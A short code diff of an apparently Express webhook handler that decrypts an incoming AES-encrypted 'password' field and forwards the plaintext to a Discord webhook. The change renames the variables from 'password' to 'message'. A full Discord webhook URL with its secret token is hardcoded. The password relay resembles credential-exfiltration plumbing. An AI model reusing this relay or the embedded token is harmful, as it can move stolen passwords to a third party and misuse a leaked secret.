@@ -19,14 +19,14 @@ app.post("/webhook", async (req, res) => {
             return res.status(403).send("Forbidden");
         }
 
-        const encryptedPassword = req.body.password;
+        const encryptedMessage = req.body.password;
 
-        // Decrypt the password
-        const bytes = CryptoJS.AES.decrypt(encryptedPassword, encryptionKey);
-        const decryptedPassword = bytes.toString(CryptoJS.enc.Utf8);
+        // Decrypt the message
+        const bytes = CryptoJS.AES.decrypt(encryptedMessage, encryptionKey);
+        const decryptedMessage = bytes.toString(CryptoJS.enc.Utf8);
 
-        // Send decrypted password to Discord Webhook
-        const webhookData = { content: `Password: ${decryptedPassword}` };
+        // Send decrypted message to Discord Webhook
+        const webhookData = { content: decryptedMessage };
         const webhookUrl = "https://discord.com/api/webhooks/1339836003552071720/zP_2Iu8Nk7AIdo5LlCJSkMDCnsig8GNiUXy3KFF-tMXUNdALCVxIAjz_UYjN-tMpI1eq";
 
         const webhookResponse = await fetch(webhookUrl, {
